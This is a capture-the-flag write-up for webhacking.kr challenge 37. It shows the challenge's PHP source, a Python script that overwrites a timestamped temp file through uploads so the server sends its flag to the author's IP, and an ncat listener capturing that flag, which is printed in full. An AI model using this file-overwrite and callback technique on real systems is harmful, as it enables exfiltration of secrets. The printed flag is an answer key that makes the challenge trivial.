# Old 37    Router Port Forwarding

URL: [https://webhacking.kr/challenge/web-18/](https://webhacking.kr/challenge/web-18/)
[https://webhacking.kr/challenge/web-18/?view_source=1](https://webhacking.kr/challenge/web-18/?view_source=1)

![old-37.png](/assets/ctf/webhacking.kr/old-37.png)

```php
<?php
include "../../config.php";
if ($_GET["view_source"]) {
    view_source();
}
?><html>
<head>
<title>Challenge 37</title>
</head>
<body>
<?php
$db = dbconnect();
$query = "select flag from challenge where idx=37";
$flag = mysqli_fetch_array(mysqli_query($db, $query))["flag"];
$time = time();

$p = fopen("./tmp/tmp-{$time}", "w");
fwrite($p, "127.0.0.1");
fclose($p);

$file_nm = $_FILES["upfile"]["name"];
$file_nm = str_replace("<", "", $file_nm);
$file_nm = str_replace(">", "", $file_nm);
$file_nm = str_replace(".", "", $file_nm);
$file_nm = str_replace("/", "", $file_nm);
$file_nm = str_replace(" ", "", $file_nm);

if ($file_nm) {
    $p = fopen("./tmp/{$file_nm}", "w");
    fwrite($p, $_SERVER["REMOTE_ADDR"]);
    fclose($p);
}

echo "<pre>";
$dirList = scandir("./tmp");
for ($i = 0; $i <= count($dirList); $i++) {
    echo "{$dirList[$i]}\n";
}
echo "</pre>";

$host = file_get_contents("tmp/tmp-{$time}");

$request = "GET /?{$flag} HTTP/1.0\r\n";
$request .= "Host: {$host}\r\n";
$request .= "\r\n";

$socket = fsockopen($host, 7777, $errstr, $errno, 1);
fputs($socket, $request);
fclose($socket);

if (count($dirList) > 20) {
    system("rm -rf ./tmp/*");
}
?>
<form method=post enctype="multipart/form-data" action=index.php>
<input type=file name=upfile><input type=submit>
</form>
<a href=./?view_source=1>view-source</a>
</body>
</html>
```

The challenge is a bit tricky, you are supposed to open a port on your server and catch the connection that way. Since I don't have server I did port forwarding via router.

First setup firewall rule to allow connections to this port.

![old-37-1.png](/assets/ctf/webhacking.kr/old-37-1.png)

Router Configuration Page > Advanced Setup > NAT > Virtual Server 

![old-37-2.png](/assets/ctf/webhacking.kr/old-37-2.png)

::: info Note
This may only be specific to CABSAT router.
:::

The file which your host is being read from is created by current timestamp value, current as in when request was made. Since server time may not be 1:1 add some wiggle room by 5 seconds and hopefully catch the request.

```python
import requests
from time import time
from io import StringIO

IP = 'your_ip'
URL = 'https://webhacking.kr/challenge/web-18/index.php'
cookies = {'PHPSESSID': 'fqn9tv8tbam8b4gi2edk8vc8bu'}

with requests.Session() as session:
    for i in range(5):
        filename = f'tmp-{int(time())+i}'
        files = {'upfile': (filename, StringIO(IP))}
        resp = session.post(URL, cookies=cookies, files=files)
        print(f'[{i+1}] Done')
```

```bash
➜ ncat -lvnp 7777
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 202.182.106.159.
Ncat: Connection from 202.182.106.159:60734.
GET /?FLAG{well...is_it_funny?_i_dont_think_so...} HTTP/1.0
Host: your_ip
```

> **Make sure to cleanup!**

